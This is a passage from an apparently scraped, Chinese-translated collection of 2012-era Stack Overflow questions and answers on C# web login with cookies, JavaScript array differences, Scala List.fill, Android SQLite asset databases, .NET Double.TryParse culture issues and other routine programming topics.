        StreamWriter myWriter2 = File.CreateText(@"C:\Users\nicholas\Documents\Visual Studio 2010\Projects\BodytelConnection\BodytelConnection\bin\\Debug\test2.txt");
        myWriter2.Write(source);
        myWriter2.Close();
        getResponse.Close();
        #endregion readSettings
    }

    private string changeString(string myString)
    {

        myString = myString.Replace("System.Windows.Controls.TextBox: ", "");
        return myString;
    }

}

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:32:31.473

您应该在每个请求中发送 cookie，否则服务器无法确定谁是用户

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T07:41:30.137

我现在明白了。感谢您的帮助高拉夫。

这是代码：

```
 private void loginBtn_Click(object sender, RoutedEventArgs e)
    {

        #region username stuff
        string benutzername = textBox_benutzername.ToString();
        string passwort = textBox_passwort.ToString();
        passwort = changeString(passwort);
        benutzername = changeString(benutzername);
        #endregion username stuff

        // get the first cookie

        CookieContainer cookies = new CookieContainer();
        CookieContainer cookieContainer = new CookieContainer();
        HttpWebRequest sessionRequest = (HttpWebRequest)WebRequest.Create("http://www.bodytel.com/");
        sessionRequest.CookieContainer = new CookieContainer();
        cookies = sessionRequest.CookieContainer;
        HttpWebResponse sessionResponse = (HttpWebResponse)sessionRequest.GetResponse();
        sessionResponse.Close();

        // login 

        HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create("https://secure.bodytel.com/de/mybodytel.html");
        req.CookieContainer = cookieContainer;
        req.Method = "POST";
        req.ContentType = "application/x-www-form-urlencoded";
        byte[] byteArray = Encoding.ASCII.GetBytes("login=" + benutzername + "&password=" + passwort + "&step=login");
        req.ContentLength = byteArray.Length;
        Stream newStream = req.GetRequestStream();
        newStream.Write(byteArray, 0, byteArray.Length);
        newStream.Close();
        HttpWebResponse res = (HttpWebResponse)req.GetResponse();

        // now connect to the other link

        req = (HttpWebRequest)HttpWebRequest.Create("https://secure.bodytel.com/de/mybodytel/settings.html");
        req.CookieContainer = cookieContainer;
        req.Method = "GET";
        res = (HttpWebResponse)req.GetResponse();
        StreamReader sr = new StreamReader(res.GetResponseStream());
        string source = sr.ReadToEnd();
        StreamWriter myWriter = File.CreateText(@"C:\Users\nicholas\Documents\Visual Studio 2010\Projects\BodytelConnection\BodytelConnection\bin\\Debug\test.txt");
        myWriter.Write(source);
        myWriter.Close();
        res.Close();
    } 
```

# javascript - 如果存在于另一个数组中，则从一个数组中删除字符串

> ID：12300163
> 
> 赞同：5
> 
> 时间：2012-09-06T12:29:21.133
> 
> 标签：javascript, jquery, arrays, nested-loops

这是一个相当基本的问题，但我正在寻找最佳解决方案。我有 2 个 javascript**字符串数组**。让我们说

```
A: ["Stark", "Targaryen", "Lannister", "Baratheon"]
B: ["Greyjoy", "Tyrell", "Stark"] 
```

由于重复*“斯塔克”*，我想从数组 A 中删除它，我的结果应该是（保留顺序）

```
A: ["Targaryen", "Lannister", "Baratheon"] 
```

我真的不关心第二个数组 B。核心 javascript 或 jQuery 中有什么可以帮助我的吗？PS：不要发布带有 IF 语句的嵌套 for 循环。可能更聪明:)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T12:37:03.987

一个完整的jQuery解决方案：

```
var a = ["Stark", "Targaryen", "Lannister", "Baratheon"];
var b = ["Greyjoy", "Tyrell", "Stark"];

var result = $.grep(a, function(n, i) {
    return $.inArray(n, b) < 0;
});

alert(result);​ 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-06T12:32:58.320

我建议你使用 underscore.js 库，特别是差异函数。 [http://underscorejs.org/#difference](http://underscorejs.org/#difference)

```
_.difference([1, 2, 3, 4, 5], [5, 2, 10]);
=> [1, 3, 4] 
```

这个库中还有其他有用的工具。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T12:35:46.850

从另一个[答案](https://stackoverflow.com/a/4026828/759846)

```
Array.prototype.diff = function(a) {
    return this.filter(function(i) {return !(a.indexOf(i) > -1);});
};

////////////////////  
// Examples  
////////////////////

[1,2,3,4,5,6].diff( [3,4,5] );  
// => [1, 2, 6]

["test1","test2","test3","test4","test5","test6"].diff(["test1","test2","test3","test4"]);      
// => ["test5", "test6"] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T12:45:04.090

也许你想喜欢

```
$(function(){
   var A = ["Stark", "Targaryen", "Lannister", "Baratheon"];
   var B = ["Greyjoy", "Tyrell", "Stark"];

    $.each(A, function (key, value) {
        if($.inArray(value, B) > -1) {
            A.splice($.inArray(value, B), 1);
        }
    });

    document.write(A);
}); 
```

# scala - 如何创建具有相同元素 n 次的列表？

> ID：12300165
> 
> 赞同：100
> 
> 时间：2012-09-06T12:29:31.893
> 
> 标签：scala

如何创建具有相同元素 n 次的列表？

手动实现：

```
scala> def times(n: Int, s: String) =
 | (for(i <- 1 to n) yield s).toList
times: (n: Int, s: String)List[String]

scala> times(3, "foo")
res4: List[String] = List(foo, foo, foo) 
```

是否还有一种内置方法可以做到这一点？

* * *

## 回答 #1

> 赞同：185
> 
> 时间：2012-09-06T12:31:48.997

请参阅[scala.collection.generic.SeqFactory.fill(n:Int)(elem: =>A)](http://www.scala-lang.org/api/current/scala/collection/generic/SeqFactory.html#fill[A](n:Int)(elem:=>A):CC[A])收集数据结构，如`Seq`,`Stream`等`Iterator`，扩展：

```
scala> List.fill(3)("foo")
res1: List[String] = List(foo, foo, foo) 
```

**警告**它在 Scala 2.7 中不可用。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2016-03-24T12:25:38.430

`tabulate`像这样使用，

```
List.tabulate(3)(_ => "foo") 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2017-05-26T19:48:59.807

```
(1 to n).map( _ => "foo" ) 
```

奇迹般有效。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-12-10T15:56:58.727

我有另一个模拟我认为的 flatMap 的答案（发现此解决方案在应用 duplicateN 时返回 Unit）

```
 implicit class ListGeneric[A](l: List[A]) {
  def nDuplicate(x: Int): List[A] = {
    def duplicateN(x: Int, tail: List[A]): List[A] = {
      l match {
       case Nil => Nil
       case n :: xs => concatN(x, n) ::: duplicateN(x, xs)
    }
    def concatN(times: Int, elem: A): List[A] = List.fill(times)(elem)
  }
  duplicateN(x, l)
} 
```

}

```
def times(n: Int, ls: List[String]) = ls.flatMap{ List.fill(n)(_) } 
```

但这是针对预先确定的列表，并且您希望将每个元素复制 n 次

# c# - TreeList 中的相同 ID 错误

> ID：12300171
> 
> 赞同：0
> 
> 时间：2012-09-06T12:30:03.223
> 
> 标签：c#, winforms, devexpress, treelist

我正在使用`TreeList`带有 C# 的 DevExpress。我有这样的场景，我有 2 张桌子。`Table # 1`包含目录信息并`Table # 2`包含文件信息。列名`Parent`是目录/文件所在的目录。

```
Folder Table
ID  Parent  Name
1     1     Folder1
2     1     Folder2
3     2     Folder3

File Table
ID   Parent   Name
1      1      file1.txt
2      2      file2.txt
3      2      file3.txt 
```

我将两个表都存储在`dt`

```
DataTable dt
ID  Parent  Name
1      1    Folder1
2      1    Folder2
3      2    Folder3
1      1    file1.txt
2      2    file2.txt
3      2    file3.txt 
```

做这样的事情

```
treelist.datasource = dt;
treelist.parentfieldname = "Parent"; 
```

我想在`treelist`. 这不起作用，因为我具有相同的文件和文件夹 ID。任何人都可以提出任何简单的解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T04:38:25.897

我相信，在这种情况下，您应该实现[动态数据加载](http://documentation.devexpress.com/#WindowsForms/CustomDocument5560)，而不是使用[绑定模式](http://documentation.devexpress.com/#WindowsForms/CustomDocument5555)来手动解析文件/文件夹关系。

相关链接：
[如何：通过](http://documentation.devexpress.com/#WindowsForms/CustomDocument5562)
[XtraTreeList 中的事件树生成算法动态加载数据](http://documentation.devexpress.com/#WindowsForms/CustomDocument198)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T05:50:16.473

我找到了一个快速简便的解决方案，我在`dt`

```
Folder Table
ID    Parent  Name
1       1     Folder1
2       1     Folder2
3       2     Folder3

File Table
ID    Parent   Name
4       1      file1.txt
5       2      file2.txt
6       2      file3.txt 
```

将两个表合并到`dt`

```
DataTable
ID    OrigID   Parent  Name
1        1       1     Folder1
2        2       1     Folder2
3        3       2     Folder3
4        1       1     file1.txt
5        2       2     file2.txt
6        3       2     file3.txt 
```

写了相同的以下几行

```
treelist.datasource = dt;
treelist.parentfieldname = "Parent"; 
```

问题解决了！

# backbone.js - 骨干路由器+咖啡脚本不起作用？

> ID：12300172
> 
> 赞同：0
> 
> 时间：2012-09-06T12:30:04.900
> 
> 标签：backbone.js, router

+我在玩骨干网和咖啡脚本，试图让路由器启动并运行。执行以下代码，init 函数可以工作，但是在浏览 localhost/#world/3 时没有任何反应，尽管它应该记录一些东西....

```
App =
  start: ->
    new App.TestRouter
    Backbone.history.start

App.TestRouter = Backbone.Router.extend
  routes: 
    "world/:id": "testView"

  initialize: ->
    new App.TestView
    console.log "Router init"

  testView: (id) ->
    console.log "testing! #{id}" 
```

这里有什么建议吗？我瞎了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T14:25:28.507

`Backbone.history.start()`是一个函数，所以你需要`()`执行它。否则，您只是获得对函数本身的引用。

```
App =
  start: ->
    new App.TestRouter
    Backbone.history.start() 
```

看到这个现场 jsFiddle：

[http://jsfiddle.net/edwardmsmith/6pNLv/8/](http://jsfiddle.net/edwardmsmith/6pNLv/8/)

# ruby - 获取k长度数组的k-1长度子集数组

> ID：12300180
> 
> 赞同：2
> 
> 时间：2012-09-06T12:30:26.953
> 
> 标签：ruby, arrays, multidimensional-array

> **可能重复：**
> [ruby 数组元素分组](https://stackoverflow.com/questions/9674010/ruby-array-element-grouping)

例子。给定数组 a：

```
a = [1, 2, 3] 
```

它的长度是 3，所以我想打印所有 2 长度的数组。这些都是：

```
[1, 2]
[1, 3]
[2, 3] 
```

我不知道 Ruby 中是否有一些方法可以获取子集数组。如果没有这样的方法，那么实现这一目标的最有效方法是什么。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T12:32:00.883

这只是两个元素的简单[组合](http://www.ruby-doc.org/core-1.9.3/Array.html#method-i-combination)：

```
 >> xs = [1, 2, 3]
 >> xs.combination(xs.size - 1).to_a
 => [[1, 2], [1, 3], [2, 3]] 
```

[编辑] 正如@Joshua 在评论中指出的那样，文档声明不能保证订单（！）。所以这是一个功能实现，它按照您要求的顺序生成组合。为了完整起见，我将它作为原始`combination`方法懒惰：

```
require 'enumerable/lazy'

class Array
  def combinations_of(n)
    if n == 0
      [[]].lazy
    else
      0.upto(self.size - 1).lazy.flat_map do |idx|
        self.drop(idx + 1).combinations_of(n - 1).map do |xs| 
          [self[idx]] + xs
        end
      end    
    end
  end
end 
```

# android - 无法在android中打开现有数据库

> ID：12300183
> 
> 赞同：0
> 
> 时间：2012-09-06T12:30:33.423
> 
> 标签：android, sqlite, sqliteopenhelper

对于我的应用程序，我已经有一个现成的数据库（即它存储在名为 example.sqlite 的资产文件夹中，其中插入了值。）

这是我的类数据库助手::

```
package com.huskerit.util;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import com.huskerit.model.AllSportData;

public class DatabaseHelper extends SQLiteOpenHelper  {
//private static final int DATABASE_VERSION = 1;

// Table name
public static final String TABLE = "all_team";
public static final String TABLE_SELECTED = "selected_team";
// Columns
public static final String ID = "id";
public static final String NAME = "name";
public static final String CATEGORY1 = "category1";
public static final String CATEGORY2 = "category2";

public static SQLiteDatabase database;
private final Context myContext;

public DatabaseHelper(Context context) 
{
    super(context, Constant.DB_NAME, null, 1);
    this.myContext = context;
}

public void onCreate(SQLiteDatabase db) 
{
}

public void createDataBase() throws IOException
{
    boolean dbExist = checkDataBase();
    System.out.println("~~~~~~~~"+dbExist);
    if(dbExist)
    {
        //do nothing - database already exist
    }
    else
    {
        //By calling this method and empty database will be created into the default system path
        //of your application so we are gonna be able to overwrite that database with our database.
        DatabaseHelper.this.getReadableDatabase();
        try 
        {
            this.close();   
            copyDataBase();
        } 
        catch (Exception e) 
        {
            e.printStackTrace();
            System.out.println(e.getMessage());
        }
    }
}

/**
 * Check if the database already exist to avoid re-copying the file
 * each time you open the application.
 * @return true if it exists, false if it doesn't
 */
private boolean checkDataBase()
{
    SQLiteDatabase checkDB = null;

    try
    {
        String myPath = Constant.DB_PATH + Constant.DB_NAME;
        checkDB = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READWRITE);

    }
    catch(SQLiteException e)
    {
        //database does't exist yet.
        e.printStackTrace();
    }

    if(checkDB != null)
    {
        checkDB.close();
    }

    return checkDB != null ? true : false;
}

/**
 * Copies your database from your local assets-folder to the just created empty database in the
 * system folder, from where it can be accessed and handled.
 * This is done by transfering bytestream.
 * */
private void copyDataBase() throws IOException{
    //Open your local db as the input stream

    // Path to the just created empty db
    String outFileName = Constant.DB_PATH + Constant.DB_NAME;

    //Open the empty db as the output stream
    OutputStream myOutput = new FileOutputStream(outFileName);
    InputStream myInput = myContext.getAssets().open(Constant.DB_NAME);
    //transfer bytes from the inputfile to the outputfile
    byte[] buffer = new byte[1024];
    int length;
    while ((length = myInput.read(buffer)) > 0) {
        myOutput.write(buffer, 0, length);
    }
    myInput.close();
    //Close the streams
    myOutput.flush();
    myOutput.close();
}

public void openDataBase() throws SQLException
{
    //Open the database
    String myPath = Constant.DB_PATH + Constant.DB_NAME;
    database = SQLiteDatabase.openDatabase(myPath,null,SQLiteDatabase.OPEN_READWRITE);
}

public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) 
{
}
} 
```

现在我像这样在我的活动中调用数据库::

```
public class TeamSelectActivity extends Activity
{

public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
     setContentView(R.layout.activity_teamselect);

    if(Constant.mDatabase == null)
    {
        Constant.mDatabase = new DatabaseHelper(TeamSelectActivity.this);
    }

    try 
    {
        //Constant.mDatabase.createDataBase(); //DataBase();
        Constant.mDatabase.openDataBase();
    } 
    catch (SQLException e) 
    {
        e.printStackTrace();
    }
}
} 
```

这是我的日志跟踪::

```
I/Database(13203): sqlite returned: error code = 14, msg = cannot open file at source line 25467
E/Database(13203): sqlite3_open_v2("/data/data/com.huskerit.login/databases/wimbim.sqlite",  &handle, 2, NULL) failed
W/System.err(13203): android.database.sqlite.SQLiteException: unable to open database file
at android.database.sqlite.SQLiteDatabase.dbopen(Native Method)
at android.database.sqlite.SQLiteDatabase.<init>(SQLiteDatabase.java:1849)
at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:820)
at com.huskerit.util.DatabaseHelper.openDataBase(DatabaseHelper.java:130)
at com.huskerit.login.TeamSelectActivity.onCreate(TeamSelectActivity.java:93)
at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1615)
at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1667)
at android.app.ActivityThread.access$1500(ActivityThread.java:117)
at android.app.ActivityThread$H.handleMessage(ActivityThread.java:935)
at android.os.Handler.dispatchMessage(Handler.java:99)
at android.os.Looper.loop(Looper.java:123)
at android.app.ActivityThread.main(ActivityThread.java:3687)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:507)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:842)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:600)
at dalvik.system.NativeStart.main(Native Method) 
```

我无法弄清楚我做错了什么..任何帮助将不胜感激..

提前致谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:41:04.443

这是由于方法 checkDataBase()。使用以下检查数据

```
 private boolean checkDataBase() {
        // TODO Auto-generated method stub
         File dbFile = new File(DB_PATH + DB_NAME);
         return dbFile.exists();
    } 
```

# java - 一个 java 进程能否获取在同一主机上运行的其他 java 进程的 id？

> ID：12300184
> 
> 赞同：-1
> 
> 时间：2012-09-06T12:30:33.270
> 
> 标签：java, profiling, instrumentation, pid

有没有办法找到当前正在运行的 jvm 并获取它们的 PID？例如，当启动 JVisualvm 时，它会显示所有本地 jvm。我怎样才能做到这一点？

**背景：**我正在从事一个仪器项目，我想将一个代理附加到另一个（未知）java 进程。这个想法是显示所有当前正在运行的 java 进程，并让用户从该列表中选择一个进程。谢谢！

**[编辑]**我的意思是进程，而不是线程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:35:56.087

你可以使用`Runtime`它。这应该为您提供继续前进的道路。

```
Process p = Runtime.getRuntime().exec(COMMAND_TO_GET_PROCESS_DATA); 
```

[参考](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Runtime.html)

# c# - Sound API 仅支持播放 PCM 波形文件

> ID：12300185
> 
> 赞同：-3
> 
> 时间：2012-09-06T12:30:38.290
> 
> 标签：c#, audio

我想在我的网络项目中播放声音文件。声音文件存储在数据库中。当我尝试播放该文件时，出现此错误。你能帮我解决这个问题吗？这是我的播放代码。

```
 byte[] bytes = dt.Rows[0]["VOICE_FILE"] as byte[];

        using (Stream s = new MemoryStream(bytes))
        {
            System.Media.SoundPlayer myPlayer = new System.Media.SoundPlayer(s);
            myPlayer.Play();
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T07:00:09.443

我的声音文件格式是这样的：

8000 Hz A-Law 比特率：64 位。

但是c#不播放这种格式。格式必须是 PCM 签名的 24 位单声道。因此发生错误。

# android - android webview中的马来亚语

> ID：12300189
> 
> 赞同：1
> 
> 时间：2012-09-06T12:30:56.947
> 
> 标签：android, webview

我试图在 android webview 中显示马拉雅拉姆语。我正在准备一个 html 并应用 thoolika unicode 字体。现在我想显示 html 内容是否有英文字母，然后用英文显示。

如何检查 html 字符串的正文中是否包含英文字母？

提前致谢

# javascript - 当我浏览返回页面时，谷歌地图信息窗口没有弹出

> ID：12300193
> 
> 赞同：2
> 
> 时间：2012-09-06T12:31:04.610
> 
> 标签：javascript, google-maps-api-3

使用 Google Maps Javascript V3，我设置了一个带有一些标记的地图。我在每个标记上都有一个侦听器，它会在单击事件上弹出一个 InfoWindow。这工作得很好。问题是当我单击页面上的任何链接然后浏览回原始页面时，InfoWindows 停止显示。我已经在监听器中添加了警报语句，所以我知道监听器正在运行，但我无法弄清楚为什么 InfoWindows 没有出现。

这是我的代码：

```
<script type="text/javascript">
var map;
var viewable;
var markerArray = new Array();
var infoWindow;
function initialize() {
    infoWindow = new google.maps.InfoWindow({ content: "holding..." });

    var mapOptions = {
      mapTypeId: google.maps.MapTypeId.ROADMAP,
      zoom: 15,
    };

    map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);

    var bounds = new google.maps.LatLngBounds();
        var loop_latlng = new google.maps.LatLng( 42.341111, -71.080707 );
        marker = addMarker( loop_latlng, "<strong>$1,495.00</strong> <br> Columbus Ave <br> 0 beds / 1 baths <br> <img src='/images/71428455_0.jpg' width=150> <br> <a href='/mls_rn/8305'>get more details</a>" );
        bounds.extend(loop_latlng);        

        var loop_latlng = new google.maps.LatLng( 42.340022, -71.0657278 );
        marker = addMarker( loop_latlng, "<strong>$2,000.00</strong> <br> Union Park St <br> 2 beds / 1 baths <br> <img src='/images/71426623_0.jpg' width=150> <br> <a href='/mls_rn/8253'>get more details</a>" );
        bounds.extend(loop_latlng);        

    map.setCenter(bounds.getCenter());
    map.fitBounds(bounds);
    showMarkers();
}

function addMarker(location,contentString) {

  var iw = new google.maps.InfoWindow({
    content: contentString
  });

  var marker = new google.maps.Marker({
    position: location,
    animation: google.maps.Animation.DROP,
    content: contentString,
    map: map
  });

  google.maps.event.addListener(marker,'click',function(){
    infoWindow.setContent(this.content); 
    infoWindow.open(map,this);
  });

  markerArray.push(marker); 

  return marker;
}

// display all the markers on the map
function showMarkers() {
  if (markerArray) {

    for ( i in markerArray ) {
      markerArray[i].setMap(map);
    }
  }
}

function loadScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "http://maps.googleapis.com/maps/api/js?key=AIzaSyCICKRjJ3Vo_l2hy5uV7GdkYBot6jCtZzI&sensor=true&callback=initialize";
  document.body.appendChild(script);
}
window.onload = loadScript;
</script> 
```

我认为这实际上可能是 Rails 问题。如果我将它剪切并粘贴到 HTML 文档中，它似乎工作得很好；但是，在我的 Rails 应用程序中，我看到了关闭行为。我注意到的一件事是地图似乎在纯 HTML 情况下重新初始化，但在 Rails 中似乎没有这样做。我会对此进行更多研究并发表评论。如果有人以前见过这个；但是，请插话！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:43:39.470

[您描述的行为在官方信息窗口示例](https://google-developers.appspot.com/maps/documentation/javascript/examples/infowindow-simple)中不会发生在我身上，所以我希望您的代码的行为方式完全相同。

您需要为此类功能手动编程。在兼容 HTML5 的浏览器上，您可以使用该[`pageshow`事件](https://developer.mozilla.org/en-US/docs/Using_Firefox_1.5_caching)手动打开信息窗口。但是，所有当前（小于 10.0）版本的 Internet Explorer 都不支持该事件，因此您还必须在窗口`load`事件中处理它。

# c# - Double.TryParse 千位分隔符返回意外结果

> ID：12300194
> 
> 赞同：8
> 
> 时间：2012-09-06T12:31:08.650
> 
> 标签：c#, .net, cultureinfo

我只是遇到了一些非常奇怪的事情，只是想知道我是否遗漏了什么。

我试图将一个字符串（带有千位分隔符）解析为一个双精度字符串，并发现了以下问题。

```
CultureInfo ci = CultureInfo.CurrentCulture; // en-ZA
string numberGroupSeparator = CultureInfo.CurrentCulture.NumberFormat.NumberGroupSeparator; //numberGroupSeparator = ,
string numberDecimalSeparator = CultureInfo.CurrentCulture.NumberFormat.NumberDecimalSeparator;//numberDecimalSeparator = .
string strValue = "242,445.24";
double try1;
double try2;
bool btry1 = Double.TryParse(strValue, out try1); //try1 = 242445.24 : btry1 = true
bool btry2 = Double.TryParse(strValue, NumberStyles.Any, null, out try2); //try2 = 0.0 : btry2 = false <- STRANGE
double try3 = Convert.ToDouble(strValue); //try3 = 242445.24 
```

现在我之所以不想使用`Convert.ToDouble`，是因为科学记数法以前给我带来了一些问题。

有人知道为什么会这样吗？

**编辑：**

我已经更新了我当前的文化信息。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-06T12:42:02.243

它按预期在我的机器上工作，所以我相信它与当前文化有关。尝试`CultureInfo.InvariantCulture`在`null`你的`TryParse`

```
Double.TryParse(strValue, NumberStyles.Any,CultureInfo.InvariantCulture, out try2); 
```

对于您当前指定的文化，它失败了`en-ZA`，我尝试了以下代码并`try2`持有 0.0

```
 Double.TryParse(strValue, NumberStyles.Any,new CultureInfo("en-ZA"), out try2); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-06T13:03:37.790

## 经过大量挖掘后更新（正确）答案

你说你现在的文化是`en-ZA`，但是检查

```
new System.Globalization.CultureInfo("en-ZA").NumberFormat.NumberGroupSeparator 
```

我们看到该值是空字符串，而不是`","`问题所述。因此，如果我们设置`CultureInfo.CurrentCulture`为，`new CultureInfo("en-ZA")`那么即使对于`try1`.

手动设置为`","`with后

```
Thread.CurrentThread.CurrentCulture.NumberFormat.NumberGroupSeparator = ","; 
```

解析成`try1`是成功的。解析成`try2`仍然失败。

对于文档中`TryParse`使用的重载`try2`非常清楚，当格式提供程序为时使用当前线程文化`null`，因此必须进行其他操作...

在仔细比较`InvariantCulture.NumberFormat`了 en-ZA 文化之后，我注意到这些文化的货币格式也不同。试

```
Thread.CurrentThread.CurrentCulture.NumberFormat.CurrencyGroupSeparator = ",";
Thread.CurrentThread.CurrentCulture.NumberFormat.CurrencyDecimalSeparator = "."; 
```

中奖：解析成功！所以真正发生的是，**在使用时`NumberStyles.All`，解析将数字视为货币**。

如果您尝试，可以验证假设

```
double.TryParse(strValue,
                NumberStyles.Any & ~NumberStyles.AllowCurrencySymbol, null, out try2); 
```

无需弄乱货币分隔符即可成功（当然`NumberGroupSeparator`必须适当）！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T12:38:51.060

[文档](http://msdn.microsoft.com/de-de/library/3s27fasw(v=vs.80).aspx) 说，当对话失败时，返回 0.0 。

TryParse 最有可能返回 false，您应该尝试调用 Parse，以获取可能告诉您问题所在的异常消息。

# ios - uilabel 上的罢工在 uitableview 中消失了选择单元格

> ID：12300211
> 
> 赞同：1
> 
> 时间：2012-09-06T12:32:29.350
> 
> 标签：ios, uikit, uilabel, uitableview

1）我想创建一个带罢工的文本，所以我使用了 ext 框架，我已经创建了它并保持在 lbal 上，当我在表格单元格中使用它时，当我选择单元格时，标签上的罢工消失了

```
#pragma mark - View lifecycle

- (void)viewDidLoad
{
    [super viewDidLoad];
}

- (void)viewDidUnload
{
    [super viewDidUnload];
}

#pragma mark TableView delegate method.
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView1
{
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView1 numberOfRowsInSection:(NSInteger)section 
{
    return 4;
}

- (CGFloat)tableView:(UITableView *)tableView1 heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return 120;
}

- (UITableViewCell *)tableView:(UITableView *)tableView1 cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView1 dequeueReusableCellWithIdentifier:CellIdentifier];
    tableView1.backgroundColor = [UIColor clearColor];
    cell=nil;

    if (cell == nil) 
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] ;     
        //cell.selectionStyle = UITableViewCellSelectionStyleNone;
        cell.backgroundColor = [UIColor clearColor];
      //  cell.backgroundView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"strip_11C.png"]];
        //cell.selectedBackgroundView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"strip_11C_h.png"]];

        UILabel *price1_lbl = [[UILabel alloc] initWithFrame:CGRectMake(2,80,100,26)];
        price1_lbl.text = @"label";
        price1_lbl.textColor = [UIColor grayColor];
        price1_lbl.font = [UIFont fontWithName:@"Arial-BoldMT" size:(13.0)];
        price1_lbl.backgroundColor = [UIColor clearColor];

        NSString *string =price1_lbl.text;
        CGSize stringSize = [string sizeWithFont:price1_lbl.font];
        CGRect buttonFrame = price1_lbl.frame;
        CGRect labelFrame = CGRectMake(buttonFrame.origin.x , 
                                       4+buttonFrame.origin.y + stringSize.height/2, 
                                       stringSize.width, 1);

        UILabel *lineLabel = [[UILabel alloc] initWithFrame:labelFrame];
        lineLabel.backgroundColor = [UIColor blackColor];
        [cell.contentView addSubview:price1_lbl];
        [cell.contentView addSubview:lineLabel]; 
    }

    return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{   
    secondviewcontroller *obj=[[secondviewcontroller alloc]initWithNibName:@"secondviewcontroller" bundle:nil];
    [self.navigationController pushViewController:obj animated:YES];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:49:12.787

尝试将删除线直接添加到带有文本 (price1_lbl) 的标签。如果这不起作用，你可能想试试[这个库。](https://gist.github.com/1054706)

* * *

**更新：**

您可以使用以下代码：

```
CGSize size = [price1_lbl.text sizeWithFont:[UIFont systemFontOfSize:16.0f]];
UILabel *line = [[UILabel alloc] initWithFrame:CGRectMake(0 , label.frame.size.height / 2, size.width, 1)];
line.backgroundColor = [UIColor blackColor];
[price1_lbl addSubview:line]; 
```

# ruby-on-rails - rails设置自定义HTTP响应？

> ID：12300217
> 
> 赞同：0
> 
> 时间：2012-09-06T12:32:46.840
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, http-headers

我试图返回一个自定义 HTTP 响应，根据我想要返回 true 或 false 的条件，正确的响应在我的 /api/validate 函数中计算

尝试了无数的事情都失败了。如何只返回真或假？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:40:59.187

你不能只返回真或假。您必须使用状态码返回正确的 http 响应。例如

*   `200 OK`- 真的
*   `422 Unprocessable Entity`- 错误的

或者，您始终可以在响应正文中返回 200 OK，并将哈希对象转换为 JSON。就像是

```
{ :result => true }.to_json 
```

# javascript - 检查元素是否将状态从隐藏更改为可见

> ID：12300229
> 
> 赞同：3
> 
> 时间：2012-09-06T12:33:08.600
> 
> 标签：javascript, jquery, javascript-events

> **可能重复：**
> [jquery 事件处理程序：div 变为可见/隐藏](https://stackoverflow.com/questions/4948323/jquery-event-handler-div-becomes-visible-hidden)

我可以设置一个事件在隐藏某些元素然后被js设置为可见后触发吗？

我还可以检测 js 是否向元素添加了类吗？

我正在使用 jQuery

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:10:13.453

是的。您可以通过事件跟踪类的添加和删除。

您可以使用事件来跟踪这一点`DOMAttrModified`- 顾名思义，每次修改 DOM 中*任何*元素的*任何*属性时都会触发该事件。

 *在这种特殊情况下，我们跟踪`class`我们希望跟踪的元素的属性修改。

**演示：http:** [//jsfiddle.net/techfoobar/dnRUu/2/](http://jsfiddle.net/techfoobar/dnRUu/2/)

在演示中，单击“切换类”按钮将类添加到第一个 DIV。您收到的警报由`DOMAttrModified`事件触发。

更多信息在这里：

